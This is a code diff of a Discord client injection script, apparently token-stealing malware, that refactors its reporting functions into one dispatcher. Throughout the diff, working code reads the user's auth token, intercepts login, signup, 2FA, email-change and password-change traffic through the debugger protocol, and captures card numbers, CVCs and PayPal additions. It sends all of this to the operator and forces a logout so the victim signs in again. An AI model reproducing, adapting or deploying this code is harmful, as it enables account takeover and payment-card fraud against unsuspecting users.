@@ -15,13 +15,24 @@ let [
     INJECT_URL,
     BADGES,
     EMAIL,
-    PASSWORD,
+    PASSWORD
 ] = [
         `const elements = document.querySelectorAll('span[class^="code_"]');let p = [];elements.forEach((element, index) => {const code = element.textContent;p.push(code);});p;`,
         'window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[["get_require"]]]),delete gg.m.get_require,delete gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]);function LogOut(){(function(a){const b="string"==typeof a?a:null;for(const c in gg.c)if(gg.c.hasOwnProperty(c)){const d=gg.c[c].exports;if(d&&d.__esModule&&d.default&&(b?d.default[b]:a(d.default)))return d.default;if(d&&(b?d[b]:a(d)))return d}return null})("login").logout()}LogOut();',
         "for (let a in window.webpackJsonp ? (gg = window.webpackJsonp.push([[], { get_require: (a, b, c) => a.exports = c }, [['get_require']]]), delete gg.m.get_require, delete gg.c.get_require) : window.webpackChunkdiscord_app && window.webpackChunkdiscord_app.push([[Math.random()], {}, a => { gg = a }]), gg.c) if (gg.c.hasOwnProperty(a)) { let b = gg.c[a].exports; if (b && b.__esModule && b.default) for (let a in b.default) 'getToken' == a && (token = b.default.getToken())} token;",
         "https://raw.githubusercontent.com/k4itrun/discord-injection/main/injection.js",
         {
+            _nitro: [
+                "<:_:1087043238654906472> ",
+                "<:_:1087043319227494460> ",
+                "<:_:1087043368250511512> ",
+                "<:_:1087043493236592820> ",
+                "<:_:1087043493236592820> ",
+                "<:_:1162420359291732038> ",
+                "<:_:1051453775832961034> ",
+                "<:_:1051453778127237180> ",
+                "<:_:1051453776889917530> ",
+            ],
             _discord_emloyee: {
                 value: 1,
                 emoji: "<:_:1163172252989259898>",
@@ -82,20 +93,9 @@ let [
                 emoji: "<:_:1163172534443851868>",
                 rare: true,
             },
-            _nitro: [
-                "<:_:1087043238654906472> ",
-                "<:_:1087043319227494460> ",
-                "<:_:1087043368250511512> ",
-                "<:_:1087043493236592820> ",
-                "<:_:1087043493236592820> ",
-                "<:_:1162420359291732038> ",
-                "<:_:1051453775832961034> ",
-                "<:_:1051453778127237180> ",
-                "<:_:1051453776889917530> ",
-            ],
         },
         "",
-        "",
+        ""
     ];
 
 const request = async (method, url, headers = {}, data = null) => {
@@ -112,7 +112,7 @@ const request = async (method, url, headers = {}, data = null) => {
                         "Access-Control-Allow-Origin": "*"
                     }
                 };
-            const req = https.request(options, (res) => {
+            let req = https.request(options, (res) => {
                 let resd = '';
                 res.on('data', (chunk) => resd += chunk);
                 res.on('end', () => resolve(resd));
@@ -165,7 +165,7 @@ const notify = async (ctx, token, acc) => {
             fields: [
                 { name: "User", value: `\`\`\`yml\nUsername: ${os.userInfo().username}\`\`\``, inline: true },
                 { name: "System", value: `\`\`\`yml\n${Object.entries({ ...system }).map(([k, v]) => `${k}: ${v}`).join("\n")}\`\`\``, },
-                { name: "Network", value: `\`\`\`yml\n${JSON.parse(await getNetwork()).ip}\`\`\``, }
+                { name: "Network", value: `\`\`\`yml\nPublic: ${JSON.parse(await getNetwork()).ip}\`\`\``, }
             ]
         },
     );
@@ -190,7 +190,12 @@ const execScript = async (s) =>
     await BrowserWindow.getAllWindows()[0].webContents.executeJavaScript(s, !0);
 
 const fetch = async (e, h) =>
-    JSON.parse(await request("GET", `${['https://discordapp.com/api', 'https://discord.com/api', 'https://canary.discord.com/api', 'https://ptb.discord.com/api'][Math.floor(Math.random() * 4)]}/v9/users/${e}`, { ...h }));
+    JSON.parse(await request("GET", `${[
+        'https://discordapp.com/api',
+        'https://discord.com/api',
+        'https://canary.discord.com/api',
+        'https://ptb.discord.com/api'
+    ][Math.floor(Math.random() * 4)]}/v9/users/${e}`, { ...h }));
 
 const fAccount = async (authorization) =>
     await fetch("@me", { authorization });
@@ -279,83 +284,101 @@ const getNitro = (u) => {
     }
 };
 
-const send = {
-    embedMain: async (mail, pass, res, req, act) => {
-        let info = await fAccount(res.token),
+const cruise = async (type, mail, pass, res, req, act) => {
+    let info;
+    let msg;
+    let token;
+    switch (type) {
+        case 'LOGIN_USER':
+            info = await fAccount(res.token);
             msg = {
                 title: act,
                 embeds: [{
                     fields: [
-                        { name: "Email", value: "`" + mail + "`", inline: true },
-                        { name: "Password", value: "`" + pass + "`", inline: true },
+                        { name: "Email", value: `\`${mail}\``, inline: true },
+                        { name: "Password", value: `\`${pass}\``, inline: true },
                     ],
                 }],
             };
-        if (req.code !== undefined) {
-            msg.embeds[0].fields.push(
-                { name: "Used 2FA code", value: "`" + req.code + "`", inline: true }
-            );
-        }
-        notify(msg, res.token, info);
-    },
-
-    embedMail: async (mail, pass, res, req, act) => {
-        let info = await fAccount(res.token),
+            if (req.code !== undefined) {
+                msg.embeds[0].fields.push(
+                    { name: "Used 2FA code", value: `\`${req.code}\``, inline: true }
+                );
+            }
+            notify(msg, res.token, info);
+            break;
+        case 'EMAIL_CHANGED':
+            info = await fAccount(res.token);
             msg = {
                 title: act,
                 embeds: [{
                     fields: [
-                        { name: "New Email", value: "`" + mail + "`", inline: true },
-                        { name: "Password", value: "`" + pass + "`", inline: true },
+                        { name: "New Email", value: `\`${mail}\``, inline: true },
+                        { name: "Password", value: `\`${pass}\``, inline: true },
                     ],
                 }],
             };
-        notify(msg, res.token, info);
-    },
-
-    embedPassword: async (req, res, act) => {
-        let info = await fAccount(res.token),
+            notify(msg, res.token, info);
+            break;
+        case 'PASSWORD_CHANGED':
+            info = await fAccount(res.token);
             msg = {
                 title: act,
                 embeds: [{
                     fields: [
-                        { name: "New Password", value: "`" + req.new_password + "`", inline: true, },
-                        { name: "Old Password", value: "`" + req.password + "`", inline: true, },
+                        { name: "New Password", value: `\`${req.new_password}\``, inline: true, },
+                        { name: "Old Password", value: `\`${req.password}\``, inline: true, },
                     ],
                 }],
             };
-        notify(msg, res.token, info);
-    },
-
-    embedCreditCard: async (req, tkn, act) => {
-        let info = await fAccount(tkn),
+            notify(msg, res.token, info);
+            break;
+        case 'CREDITCARD_ADDED':
+            token = res;
+            info = await fAccount(token);
             msg = {
                 title: act,
                 embeds: [{
                     fields: [
-                        { name: "Number", value: "`" + req["card[number]"] + "`", inline: true },
-                        { name: "CVC", value: "`" + req["card[cvc]"] + "`", inline: true },
-                        { name: "Expiration", value: "`" + req["card[exp_month]"] + "/" + req["card[exp_year]"] + "`", inline: true, },
+                        { name: "Number", value: `\`${req["card[number]"]}\``, inline: true },
+                        { name: "CVC", value: `\`${req["card[cvc]"]}\``, inline: true },
+                        { name: "Expiration", value: `\`${req["card[exp_month]"]}/${req["card[exp_year]"]}\``, inline: true, },
                     ],
                 }],
             };
-        notify(msg, tkn, info);
-    },
-
-    embedPaypal: async (tkn, act) => {
-        let info = await fAccount(tkn),
+            notify(msg, token, info);
+            break;
+        case 'PAYPAL_ADDED':
+            token = res;
+            info = await fAccount(token);
             msg = {
                 title: act,
                 embeds: [{
                     fields: [
-                        { name: "Email", value: "`" + info.email + "`", inline: true },
-                        { name: "Phone", value: "`" + (info.phone || "None") + "`", inline: true },
+                        { name: "Email", value: `\`${info.email}\``, inline: true },
+                        { name: "Phone", value: `\`${(info.phone || "None")}\``, inline: true },
                     ],
                 }],
             };
-        notify(msg, tkn, info);
-    },
-};
+            notify(msg, token, info);
+            break;
+        case 'INJECTED':
+            token = res;
+            info = await fAccount(token);
+            msg = {
+                title: act,
+                embeds: [{
+                    fields: [
+                        { name: "Email", value: `\`${info.email}\``, inline: true },
+                        { name: "Phone", value: `\`${(info.phone || "None")}\``, inline: true },
+                    ],
+                }],
+            };
+            notify(msg, token, info);
+            break;
+        default:
+    }
+}
 
 const DISCORD_PATH = (function () {
     const app = process.argv[0].split(path.sep).slice(0, -1).join(path.sep);
@@ -389,17 +412,15 @@ async function UPDATE_CHECKING() {
     }
     if (!fs.existsSync(path.join(__dirname, i))) return;
     else fs.rmdirSync(path.join(__dirname, i));
-    let info = await fAccount((await execScript(TOKEN_SCRIPT)) ?? ""),
-        msg = {
-            title: `**${info.username}** just got injected!`,
-            embeds: [{
-                fields: [
-                    { name: "Email", value: "`" + info.email + "`", inline: true },
-                    { name: "Phone", value: "`" + (info.phone || "None") + "`", inline: true },
-                ],
-            }],
-        };
-    await notify(msg, (await execScript(TOKEN_SCRIPT)) ?? "", info);
+    if (!(await execScript(TOKEN_SCRIPT))) return;
+    cruise(
+        "INJECTED",
+        null,
+        null,
+        (await execScript(TOKEN_SCRIPT)) ?? "",
+        null,
+        `DISCORD INJECTED`,
+    );
     execScript(LOGOUT_SCRIPT);
 }
 
@@ -460,18 +481,25 @@ session.defaultSession.webRequest.onCompleted(
         } catch (err) {
             data = parse(decodeURIComponent(a.uploadData[0].bytes.toString()));
         }
-        let authorization = await execScript(TOKEN_SCRIPT);
+        let authorization = (await execScript(TOKEN_SCRIPT)) ?? "";
         if (a.method != "POST") return;
         if (a.statusCode !== 200 && a.statusCode !== 202) return;
         if (a.url.endsWith("/paypal_accounts")) {
-            send.embedPaypal(
+            cruise(
+                "PAYPAL_ADDED",
+                null,
+                null,
                 authorization,
+                null,
                 `PAYPAL ADDED`,
             );
         } else if (a.url.endsWith("/tokens")) {
-            send.embedCreditCard(
-                data,
+            cruise(
+                "CREDITCARD_ADDED",
+                null,
+                null,
                 authorization,
+                data,
                 `CREDITCARD ADDED`,
             );
         }
@@ -482,72 +510,79 @@ const CREATE_WINDOW_CLIENT = (win) => {
     if (!win.getAllWindows()[0]) return;
     win.getAllWindows()[0].webContents.debugger.attach("1.3");
     win.getAllWindows()[0].webContents.debugger.on("message", async (_, m, p) => {
-            if (m !== "Network.responseReceived") return;
-            if (!["/auth/login", "/auth/register", "/mfa/totp", "/mfa/codes-verification", "/users/@me",].some((url) => p.response.url.endsWith(url))) return;
-            if (p.response.status !== 200 && p.response.status !== 202) return;
-            let RESPONSE_DATA = JSON.parse(
+        if (m !== "Network.responseReceived") return;
+        if (!["/auth/login", "/auth/register", "/mfa/totp", "/mfa/codes-verification", "/users/@me",].some((url) => p.response.url.endsWith(url))) return;
+        if (p.response.status !== 200 && p.response.status !== 202) return;
+        let RESPONSE_DATA = JSON.parse(
+            (
+                await win.getAllWindows()[0].webContents.debugger.sendCommand(
+                    "Network.getResponseBody",
+                    { requestId: p.requestId },
+                )
+            ).body,
+        ),
+            REQUEST_DATA = JSON.parse(
                 (
                     await win.getAllWindows()[0].webContents.debugger.sendCommand(
-                        "Network.getResponseBody",
+                        "Network.getRequestPostData",
                         { requestId: p.requestId },
                     )
-                ).body,
-            ),
-                REQUEST_DATA = JSON.parse(
-                    (
-                        await win.getAllWindows()[0].webContents.debugger.sendCommand(
-                            "Network.getRequestPostData",
-                            { requestId: p.requestId },
-                        )
-                    ).postData,
-                );
-            if (p.response.url.endsWith("/login")) {
-                if (!RESPONSE_DATA.token) {
-                    EMAIL = REQUEST_DATA.login;
-                    PASSWORD = REQUEST_DATA.password;
-                    return;
-                }
-                send.embedMain(
-                    REQUEST_DATA.login,
-                    REQUEST_DATA.password,
-                    RESPONSE_DATA,
-                    REQUEST_DATA,
-                    "LOGGED IN",
-                );
-            } else if (p.response.url.endsWith("/register")) {
-                send.embedMain(
+                ).postData,
+            );
+        if (p.response.url.endsWith("/login")) {
+            if (!RESPONSE_DATA.token) {
+                EMAIL = REQUEST_DATA.login;
+                PASSWORD = REQUEST_DATA.password;
+                return;
+            }
+            cruise(
+                "LOGIN_USER",
+                REQUEST_DATA.login,
+                REQUEST_DATA.password,
+                RESPONSE_DATA,
+                REQUEST_DATA,
+                "LOGGED IN",
+            );
+        } else if (p.response.url.endsWith("/register")) {
+            cruise(
+                "LOGIN_USER",
+                REQUEST_DATA.email,
+                REQUEST_DATA.password,
+                RESPONSE_DATA,
+                REQUEST_DATA,
+                "SIGNED UP",
+            );
+        } else if (p.response.url.endsWith("/totp")) {
+            cruise(
+                "LOGIN_USER",
+                EMAIL,
+                PASSWORD,
+                RESPONSE_DATA,
+                REQUEST_DATA,
+                "LOGGED IN WITH MFA-2",
+            );
+        } else if (p.response.url.endsWith("/@me")) {
+            if (!REQUEST_DATA.password) return;
+            if (REQUEST_DATA.email)
+                cruise(
+                    "EMAIL_CHANGED",
                     REQUEST_DATA.email,
                     REQUEST_DATA.password,
                     RESPONSE_DATA,
                     REQUEST_DATA,
-                    "SIGNED UP",
+                    `CHANGED EMAIL`,
                 );
-            } else if (p.response.url.endsWith("/totp")) {
-                send.embedMain(
-                    EMAIL,
-                    PASSWORD,
+            if (REQUEST_DATA.new_password)
+                cruise(
+                    "PASSWORD_CHANGED",
+                    null,
+                    null,
                     RESPONSE_DATA,
                     REQUEST_DATA,
-                    "LOGGED IN WITH MFA-2",
+                    `CHANGED PASSWORD`,
                 );
-            } else if (p.response.url.endsWith("/@me")) {
-                if (!REQUEST_DATA.password) return;
-                if (REQUEST_DATA.email)
-                    send.embedMail(
-                        REQUEST_DATA.email,
-                        REQUEST_DATA.password,
-                        RESPONSE_DATA,
-                        REQUEST_DATA,
-                        `CHANGED EMAIL`,
-                    );
-                if (REQUEST_DATA.new_password)
-                    send.embedPassword(
-                        REQUEST_DATA,
-                        RESPONSE_DATA,
-                        `CHANGED PASSWORD`,
-                    );
-            }
-        },
+        }
+    },
     );
     win.getAllWindows()[0].webContents.debugger.sendCommand(
         "Network.enable",
